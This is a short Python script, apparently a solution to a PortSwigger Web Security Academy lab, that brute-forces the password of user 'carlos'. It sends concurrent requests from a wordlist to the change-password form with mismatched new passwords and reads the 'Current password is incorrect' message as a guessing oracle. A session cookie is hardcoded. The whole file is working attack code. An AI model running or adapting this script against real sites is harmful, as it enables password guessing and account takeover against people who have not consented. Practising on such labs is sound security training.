import aiohttp
import asyncio

url = 'https://ac4a1f251f000e34c07219f1000c0005.web-security-academy.net/my-account/change-password'
cookies = {'session': 'S8S74l5XS0CJB8aJAYem8VPjn8iPKHRm'}

target_username = 'carlos'

async def test_password(password):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        data = {'username': target_username, 'current-password': password, 'new-password-1': 'asdf', 'new-password-2': 'fda'}
        async with session.post(url=url, data=data) as resp:
            text = await resp.text()
            return (password, 'Current password is incorrect' in text)

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        tasks = []
        with open('passwords.txt', 'r') as f:
            for password in f.readlines():
                tasks.append(asyncio.ensure_future(test_password(password.strip()))) 

        res = await asyncio.gather(*tasks)
        for password, invalid in res:
            if not invalid:
                print(f"Password found: {password}")

asyncio.run(main())
